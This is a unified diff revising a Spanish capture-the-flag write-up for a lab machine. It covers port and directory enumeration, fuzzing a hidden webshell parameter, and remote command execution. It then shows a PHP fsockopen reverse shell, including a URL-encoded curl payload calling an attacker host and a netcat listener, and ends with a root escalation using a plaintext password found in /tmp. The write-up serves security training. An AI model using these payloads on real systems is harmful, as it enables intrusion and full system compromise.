@@ -1,4 +1,5 @@
 ## 1. Reconocimiento Inicial con Nmap
+Iniciamos la auditoría realizando un escaneo de puertos para identificar la superficie de ataque expuesta.
 
 ```bash
 nmap -sC -sV --open 172.17.0.2
@@ -12,69 +13,68 @@ nmap -sC -sV --open 172.17.0.2
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 ```
 
-La salida de `nmap` indica que el puerto 80 está abierto y que un servidor web Apache httpd versión 2.4.57 (Debian) está en ejecución. El título de la página web es "Academia de Inglés (Inglis Academi)", lo que nos da una pista sobre el tipo de contenido alojado. Además, se observa una nota en el ejercicio que dice: "Guardo un secretito en /tmp ;)", lo que sugiere que hay información relevante en el directorio `/tmp` del sistema, posiblemente para la fase de escalada de privilegios.
+- `80/tcp open http Apache httpd 2.4.57 (Debian)`: Servidor web activo. El título de la página es "Academia de Inglés (Inglis Academi)".
+
+_Nota: La descripción del ejercicio (o _briefing_) nos proporciona una pista contextual importante: "Guardo un secretito en /tmp ;)". Tendremos esto en cuenta para fases posteriores._
 
 ## 2. Enumeración de Contenido Web con Gobuster
 
 Dado que se ha identificado un servidor web, el siguiente paso es enumerar directorios y archivos ocultos o no enlazados. 
 
 ```bash
-gobuster dir -u http://172.17.0.2 -w /home/eduard/WordList/directories.txt -x php,txt,html,php.bak
+gobuster dir -u http://<IP_DEL_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
 ```
 
- **Resultado de Gobuster**
+**Resultado de Gobuster**
 ```
 /index.html           (Status: 200) [Size: 2510]  
 /shell.php            (Status: 500) [Size: 0]  
 /warning.html         (Status: 200) [Size: 315]
 ```
 
-Revela varios archivos interesantes:
+Resultados:
 
 *   `/index.html`: La página principal del sitio web.
 *   `/shell.php`: Un archivo PHP que devuelve un código de estado `500` (Error Interno del Servidor) y un tamaño de 0 bytes. Esto es una fuerte indicación de que podría ser una webshell, pero que requiere un parámetro específico para funcionar correctamente.
-*   `/warning.html`: Un archivo HTML que contiene un mensaje relevante.
+- `/warning.html`: Al inspeccionar este archivo en el navegador, encontramos el siguiente mensaje: _"Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo..."_.
 
-Al acceder a `warning.html`, se encuentra el siguiente mensaje:
+Esta pista confirma nuestras sospechas: existe una webshell funcional en `/shell.php`, pero necesitamos descubrir el nombre del parámetro mediante _fuzzing_.
 
-> Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo...
-
-Esta es una pista crucial que confirma la existencia de una webshell (`shell.php`) y que su funcionamiento depende de un parámetro desconocido. El objetivo ahora es descubrir este parámetro.
-
----
-Antes de atacar shell.php,  descargamos las imágenes con wget `htttp://<ip><img>` y usamos steghide y exiftool en ellas en busca de información oculta, pero sin obtener resultado.
-
+Probamos, sin éxito a buscar texto ofuscado dentro de las imágenes `http://<ip>/<img>`.
 
 ### 3. Fuzzing de Parámetros con Wfuzz
-El siguiente paso lógico es realizar un fuzzing de parámetros en `shell.php` para identificar el correcto que activa la funcionalidad de la webshell. 
+Para descubrir el parámetro oculto que activa la funcionalidad de la webshell, utilizamos `wfuzz`. Inyectamos la palabra clave `FUZZ` en la posición del parámetro y le pasamos el valor `id` (un comando inofensivo de Linux). El objetivo es observar una respuesta diferencial (distinta a 0 líneas/palabras) cuando se adivine el parámetro correcto y el comando se ejecute.
 
 ```bash
-wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
+wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://<IP_DEL_OBJETIVO>/shell.php?FUZZ=id"
 ```
 
-**Resultado**: "parameter".
+- `--hl=0` oculta las respuestas que devuelven 0 líneas, filtrando así los intentos fallidos.
 
-El resultado del `wfuzz` devuelve 2 líneas, a diferencia de otros intentos que devuelven 0 líneas. Esto indica que `shell.php?parameter=id` está ejecutando el comando `id` y devolviendo su salida. Esto confirma que se ha logrado una Ejecución Remota de Comandos (RCE).
+**Resultado**: "parameter". Comprobamos la Ejecución Remota de Comandos (RCE) accediendo a `http://<IP_DEL_OBJETIVO>/shell.php?parameter=whoami`, lo cual nos devuelve la ejecución esperada (ej. `www-data`).
 
 ![[WhereIsMyWebShell_Fuzzing.png]]
 
 ## 4. Obtención de una Reverse Shell
 
-Una vez que se ha confirmado la RCE, el siguiente paso es obtener una `reverse shell` para tener una conexión interactiva y estable con la máquina objetivo. Una `reverse shell` es una conexión iniciada desde la máquina objetivo hacia la máquina del atacante, lo que a menudo evade los firewalls que bloquean las conexiones entrantes.
+Confirmado el RCE, procedemos a establecer una conexión interactiva (Reverse Shell) hacia nuestra máquina atacante para mayor comodidad y estabilidad.
 
-### Preparación del Listener en la Máquina Atacante
+### 4.1. Preparación del Listener
 
-En la máquina del atacante, se configura un `listener` utilizando `netcat` para esperar la conexión entrante de la `reverse shell`.
+En nuestra máquina atacante, configuramos `netcat` para escuchar conexiones entrantes.
 
-```bash
-nc -lnvp 443
+```Bash
+nc -nlvp 443
 ```
 
+### 4.2. Ejecución del Payload
 
-### Generación y Ejecución de la PHP Reverse Shell
+Utilizamos un payload clásico de Reverse Shell en PHP, adaptado con nuestra IP y puerto.
 
-Se busca una `PHP reverse shell` adecuada en recursos como `https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/`. La plantilla utilizada es:
+**Payload Base:**
+
 ![[WhereIsMyWebShell_Reverse_Shell.png]]
+
 ```php
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
@@ -84,70 +84,66 @@ Se ajusta la IP y el puerto a los de la máquina atacante (`172.17.0.1` y `443` 
 ```php
 php -r '$sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-*   `fsockopen("172.17.0.1",443)`: Abre un socket TCP y se conecta a la IP y puerto especificados de la máquina atacante.
-*   `exec("/bin/sh -i <&3 >&3 2>&3")`: Ejecuta una shell interactiva (`/bin/sh -i`) y redirige la entrada, salida y error estándar a través del socket abierto, estableciendo así la `reverse shell`.
 
-Finalmente, esta cadena PHP se codifica en URL para ser inyectada a través del parámetro `parameter` de `shell.php`:
+Para enviarlo de forma segura a través de la URL (método GET), codificamos el payload en formato URL (_URL Encode_):
 
 ```
-http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22172.17.0.1%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+php%20-r%20%27%24sock%3Dfsockopen(%22<IP_ATACANTE>%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 ```
 
-Al acceder a esta URL en el navegador (o a través de `curl`), el navegador se quedará "colgado" o mostrará un error, lo que es una señal de que la `reverse shell` se ha ejecutado y la conexión se ha establecido con el `listener` de `netcat` en la máquina atacante. Se verifica el usuario actual con `whoami`:
+Inyectamos el payload codificado en la webshell:
 
-```bash
+```Bash
+curl "http://<IP_DEL_OBJETIVO>/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22<IP_ATACANTE>%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27"
+```
+
+El terminal donde ejecutamos el listener recibe la conexión.
+
+```Bash
 $ whoami  
 # www-data
 ```
-
 ## 5. Escalada de Privilegios
 
 La pista inicial "Guardo un secretito en /tmp ;)" es fundamental para la escalada de privilegios. 
 
-Se navega al directorio `/tmp`:
+### 5.1. Búsqueda de Información Sensible
 
-```bash
+Navegamos al directorio temporal y listamos todos los archivos, incluyendo los ocultos (`-a` o `-la`).
+
+```Bash
 cd /tmp
+ls -la
 ```
 
-Un `ls` normal no muestra nada, lo que sugiere que el archivo es oculto. Por lo que usamos la opción `-a`
-
-```bash
-ls -a
-```
-
-Revela el archivo oculto `.secret.txt`:
+**Salida:**
 
 ```
-drwxrwxrwt 1 root root  6 Aug  1 17:33 .  
-drwxr-xr-x 1 root root 39 Aug  1 17:33 ..  
--rw-r--r-- 1 root root 21 Apr 12  2024 .secret.txt
+drwxrwxrwt 1 root root  6 Aug  1 17:33 .  
+drwxr-xr-x 1 root root 39 Aug  1 17:33 ..  
+-rw-r--r-- 1 root root 21 Apr 12  2024 .secret.txt
 ```
 
-Finalmente, se lee el contenido de `.secret.txt` para obtener la contraseña:
-
-```bash
-$ cat .secret.txt  
-contraseñaderoot123
-```
-
+Identificamos el archivo oculto `.secret.txt`. Al inspeccionar su contenido, obtenemos una contraseña en texto plano:
 La contraseña `contraseñaderoot123` es la clave para escalar a `root`.
 
-### Escalada a Root 
-
-Con la contraseña de `root`, se utiliza el comando `su` (substitute user) para cambiar al usuario `root`.
-
-```bash
-$ su -
-Password: contraseñaderoot123
+```Bash
+cat .secret.txt  
+# contraseñaderoot123
 ```
 
-*   `su -`: El guion (`-`) después de `su` indica que se debe iniciar una shell de login para el usuario `root`, lo que significa que se cargará el entorno completo del usuario `root` (incluyendo su PATH y variables de entorno), lo cual es importante para asegurar que todos los comandos de `root` estén disponibles.
+### 5.2. Escalada a Root
 
+Asumiendo que esta es la contraseña del superusuario, utilizamos el comando `su` (Substitute User) para escalar privilegios. El uso del guion (`-`) asegura que carguemos completamente las variables de entorno de `root` (como el PATH).
 
-```bash
+```Bash
+su -
+# Password: contraseñaderoot123
+```
+
+Confirmamos el compromiso total del sistema:
+
+```Bash
 whoami  
-root
+# root
 ```
-
-Esto confirma que la escalada de privilegios ha sido exitosa y se tiene control total sobre el sistema como usuario `root`.
